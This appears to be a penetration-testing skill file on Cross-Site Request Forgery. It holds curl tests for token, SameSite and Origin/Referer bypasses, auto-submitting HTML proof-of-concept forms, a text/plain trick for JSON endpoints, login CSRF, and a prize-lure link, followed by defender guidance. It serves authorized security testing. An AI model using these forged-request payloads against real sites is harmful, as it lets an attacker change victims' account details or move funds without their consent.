---
name: csrf
description: Use when testing a web application for Cross-Site Request Forgery
  on an authorized engagement. Covers mapping state-changing requests,
  detecting missing or weak anti-CSRF tokens, building HTML proof-of-concept
  exploits, testing SameSite cookie behavior, bypassing Referer and Origin
  checks, and attacking login CSRF and token-validation flaws. Use when forms,
  account settings, password changes, or API actions change state without a
  per-request token, or when you need to prove a forged cross-site request
  executes as the victim.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [webapp-pentest-methodology, auth-attacks, web-xss]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

Cross-Site Request Forgery (CSRF) tricks a logged-in user's browser into
sending a request the user never intended, riding on the victim's session.
This skill covers the full authorized methodology: finding state-changing
requests, testing token defenses, building proof-of-concept exploits, and
bypassing common CSRF protections. All testing targets systems you have
written permission to test.

## Quick Workflow

1. Proxy all traffic and list every state-changing request (POST, PUT,
   PATCH, DELETE, and GET requests that change data).
2. Check each request for an anti-CSRF token: a random per-request value in
   a hidden field, header, or double-submit cookie.
3. Inspect the session cookie attributes: SameSite, Secure, HttpOnly, and
   Path.
4. Remove or replay the token to test whether the server actually validates
   it.
5. Build a minimal HTML proof of concept that auto-submits the forged
   request cross-site.
6. Test Referer and Origin based defenses for bypasses (missing header,
   subdomain, crafted suffix).
7. Test token validation flaws: tokens tied to session only, predictable
   tokens, tokens not bound to the user, and tokens accepted via GET.
8. Confirm impact by showing the state change lands on the victim account,
   then document the request and response pair.

## 1. Mapping state-changing requests

CSRF only matters where a request changes something: password changes,
email changes, transfers, profile updates, admin actions, API mutations.
Walk the application in Burp with the proxy on and flag every such
request.

```bash
# List candidate requests from a Burp-exported history or access log:
# look for POST/PUT/PATCH/DELETE and GET requests with side effects
grep -E '"(POST|PUT|PATCH|DELETE) ' /tmp/access.log | awk '{print $6, $7}' | sort -u | head -30
```

```bash
# Quick check: does a state-changing endpoint also work over GET?
# (GET endpoints that change state are trivially CSRF-able via <img>)
curl -s -b "session=VICTIMSESSION" \
  'https://target.example/account/change-email?email=attacker@example.com' \
  -o /dev/null -w '%{http_code}\n'
```

Record for each request: the method, the parameters, whether a token is
present, and the cookie attributes from the Set-Cookie response headers.

```bash
# Inspect cookie attributes the server sets
curl -s -D - 'https://target.example/login' -o /dev/null | grep -i '^set-cookie'
```

## 2. Token validation testing

A token only protects if the server checks it correctly. Test each of
these, one change at a time, replaying the request with curl.

```bash
# Baseline: capture a valid request from Burp, save it, then replay it
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -d 'email=victim@example.com&csrf=VALIDTOKEN123' \
  -o /tmp/base.html -w 'baseline: %{http_code}\n'

# Test 1: token removed entirely
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -d 'email=attacker@example.com' \
  -w 'no-token: %{http_code}\n' -o /dev/null

# Test 2: empty token
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -d 'email=attacker@example.com&csrf=' \
  -w 'empty-token: %{http_code}\n' -o /dev/null

# Test 3: wrong token value
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -d 'email=attacker@example.com&csrf=wrongvalue' \
  -w 'bad-token: %{http_code}\n' -o /dev/null

# Test 4: another user's valid token (is the token bound to the session?)
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -d 'email=attacker@example.com&csrf=OTHERUSERSTOKEN' \
  -w 'cross-user-token: %{http_code}\n' -o /dev/null
```

Compare each response code and body against the baseline. If any test
succeeds (same state change as baseline), the token check is broken.

Further checks:

```bash
# Is the token accepted as a GET parameter too? (leaks in logs and Referer)
curl -s 'https://target.example/account/email?email=attacker@example.com&csrf=VALIDTOKEN123' \
  -b 'session=VICTIMSESSION' -o /dev/null -w 'token-in-get: %{http_code}\n'

# Is the token predictable? Request several tokens and look for a pattern
for i in 1 2 3 4 5; do
  curl -s -b 'session=VICTIMSESSION' 'https://target.example/account/settings' \
    | grep -o 'csrf[^>]*value="[^"]*"' | head -1
done
```

Predictable tokens (timestamps, sequential IDs, MD5 of the username) let
an attacker forge requests without ever reading the victim's page.

## 3. SameSite cookie testing

SameSite=Lax (the modern default) blocks cross-site POST cookies but still
allows top-level GET. SameSite=None requires Secure. Test what the cookie
actually enforces.

```bash
# Confirm the exact cookie flags the application sets
curl -s -I 'https://target.example/' | grep -i 'set-cookie'
```

Key test cases:

- Cookie has no SameSite attribute: the browser sends it on every
  cross-site request, so classic CSRF works if no token exists.
- SameSite=Lax: a cross-site POST is blocked, but a state-changing GET
  still carries the cookie when reached by top-level navigation
  (a link click, not an `<img>`).
- SameSite=None without Secure: browsers reject the cookie, which can
  break sessions in odd ways worth noting.
- Two cookies set for the same name (one Lax, one None): some frameworks
  do this for compatibility; test which one the server honors.

You cannot change the victim's browser, so document the observed
attributes and match the proof of concept to what the browser will allow.

## 4. Referer and Origin check bypasses

Some applications skip tokens and instead check the Referer or Origin
header. These checks are often bypassable.

```bash
# Baseline with a correct Origin
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -H 'Origin: https://target.example' \
  -d 'email=victim@example.com' -o /dev/null -w 'good-origin: %{http_code}\n'

# Missing Origin header (some apps allow it for "privacy" reasons)
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -d 'email=attacker@example.com' -o /dev/null -w 'no-origin: %{http_code}\n'

# Attacker origin
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -H 'Origin: https://evil.example' \
  -d 'email=attacker@example.com' -o /dev/null -w 'evil-origin: %{http_code}\n'

# Subdomain of the target (often allow-listed by mistake)
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -H 'Origin: https://target.example.evil.example' \
  -d 'email=attacker@example.com' -o /dev/null -w 'suffix-bypass: %{http_code}\n'

# Referer pointing at an attacker page under a trusted prefix
curl -s -X POST 'https://target.example/account/email' \
  -b 'session=VICTIMSESSION' \
  -H 'Referer: https://target.example@evil.example/' \
  -d 'email=attacker@example.com' -o /dev/null -w 'referer-trick: %{http_code}\n'
```

Watch for naive string matching: `endswith("target.example")` accepts
`target.example.evil.example`, and `contains("target.example")` accepts
almost anything. Also test the case where both headers are stripped by a
`<meta name="referrer" content="never">` on the attack page, since the
server may treat a missing header as acceptable.

## 5. Building the proof of concept

A proof of concept must run from an attacker-controlled origin and submit
without user interaction. Serve it over HTTPS on a domain you control.

```html
<!-- /tmp/csrf-poc.html: auto-submitting POST proof of concept -->
<html>
  <body>
    <form id="f" action="https://target.example/account/email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>document.getElementById("f").submit();</script>
  </body>
</html>
```

```bash
# Serve the PoC and test it yourself with a logged-in test browser
cd /tmp && python3 -m http.server 8443 --bind 127.0.0.1 &
# Open http://127.0.0.1:8443/csrf-poc.html in a browser logged into
# the target as the VICTIM test account, then verify the email changed.
```

For JSON APIs, a plain form cannot set `Content-Type: application/json`,
so test whether the endpoint also accepts form encoding:

```bash
# Does the JSON endpoint accept urlencoded bodies? (many frameworks do)
curl -s -X POST 'https://target.example/api/email' \
  -b 'session=VICTIMSESSION' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=attacker@example.com' -o /dev/null -w 'form-to-json-api: %{http_code}\n'
```

If it does, the form PoC works. If it strictly requires JSON, CSRF is
harder: test with `text/plain` (a form can send that via
`enctype="text/plain"`) and see if the server still parses the body as
JSON.

```html
<!-- text/plain trick for JSON endpoints that are lenient parsers -->
<html>
  <body>
    <form id="f" action="https://target.example/api/email" method="POST"
          enctype="text/plain">
      <input type="hidden" name='{"email":"attacker@example.com","x":"'
             value='"}'>
    </form>
    <script>document.getElementById("f").submit();</script>
  </body>
</html>
```

## 6. Login CSRF

Login CSRF forces the victim's browser to log in as the attacker. The
victim then types real data (payment details, private notes) into the
attacker's account. Test whether the login form has token protection.

```bash
# Submit a login cross-site with the attacker's credentials
curl -s -X POST 'https://target.example/login' \
  -c /tmp/victim.jar \
  -d 'username=attacker&password=AttackerPass1!' \
  -o /dev/null -w 'login-no-token: %{http_code}\n'
```

If the login succeeds without a token, build the same auto-submit PoC
pointing at `/login` with the attacker's credentials, then document the
session-fixation style impact: anything the victim enters afterwards is
visible to the attacker by logging in as themselves.

## 7. GET-based and multi-step flows

Some applications split an action across steps (confirm page, then
execute). Test whether the final step alone is enough.

```bash
# Skip the confirmation step: call the final endpoint directly
curl -s -X POST 'https://target.example/transfer/confirm' \
  -b 'session=VICTIMSESSION' \
  -d 'to=attacker&amount=100' -o /dev/null -w 'skip-confirm: %{http_code}\n'
```

Also check state-changing GETs reachable by top-level navigation under
SameSite=Lax, which still sends cookies on a clicked link:

```html
<!-- Lax bypass: a normal link click is top-level navigation, cookie sent -->
<a href="https://target.example/account/delete?confirm=yes">
  Click to claim your prize
</a>
```

## Edge cases

- The token is validated but also sent as a cookie (double submit). Try
  setting both the cookie and the parameter to the same attacker-chosen
  value; if the server only checks they match, you can forge requests
  freely.
- Token is per-session, not per-request. Replaying your own token in the
  victim's session still fails the binding test, but a token leaked
  anywhere (logs, Referer, browser history) stays valid for the whole
  session, so note the exposure window.
- CORS `Access-Control-Allow-Origin: *` with credentials is a different
  bug (CORS misconfiguration), not CSRF; do not conflate them in the
  report.
- The application uses a custom header (for example `X-Requested-With`)
  as its CSRF defense. Browsers block cross-site JavaScript from setting
  custom headers without a preflight, so this is a valid defense unless
  the server also accepts the request without the header.
- Flash or plugin-based bypasses are dead; do not waste time on them.
- SameSite=Lax-by-default in the browser does not protect users on older
  browsers. Mention the residual risk but do not claim full exploitability
  on modern browsers when Lax blocks your PoC.

## Escalation

- Token validation passes inconsistently: the server may check the token
  only on some code paths. Map every alias of the endpoint (trailing
  slash, `.json` suffix, HTTP method override via `_method` parameter)
  and test each one.
- The token is bound to the session but the session identifier is
  predictable or fixable: chain with session fixation to plant a known
  session, then the token check passes because the session is yours.
- Referer checks strip to the registrable domain: try an attacker
  subdomain under a trusted parent if the app allows user subdomains.
- The PoC is blocked by a strict Content Security Policy on the
  *attack* page: host the PoC without inline scripts (use an external
  script file or a meta refresh form) so your own CSP does not break the
  demo.
- JSON-only endpoints: probe for method override (`X-HTTP-Method-Override:
  POST` on a GET) or content-type confusion before declaring it safe.

## Detection and defender view

Defenders see CSRF as state-changing requests arriving with no valid
token, or with tokens that fail validation, often from users who clicked
a link moments earlier. Logs show the malicious request's Referer or
Origin pointing at an unrelated domain, which is the clearest signal. The
durable fix is a per-request unpredictable token bound to the user
session, validated on every state-changing request, plus
`SameSite=Lax` (or Strict for sensitive actions) on session cookies.
Tokens must be single-use or rotated, never accepted via GET, and never
leaked into URLs. Referer and Origin checks are defense in depth, not a
replacement for tokens. For APIs consumed by browsers, require a custom
header or use SameSite cookies with strict settings.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): abusing exposed
  state-changing endpoints.
- MITRE ATT&CK T1539 (Steal Web Session Cookie): related session attacks.
- CWE-352 (Cross-Site Request Forgery).
- CWE-1275 (Sensitive Cookie with Improper SameSite Attribute).
- CWE-642 (External Control of Critical State Data): login CSRF class.
- OWASP Testing Guide: Testing for Cross Site Request Forgery
  (OTG-SESS-005).
- OWASP CSRF Prevention Cheat Sheet.
- PortSwigger Web Security Academy: CSRF labs and cheat sheet.
- MDN: Set-Cookie SameSite attribute documentation.
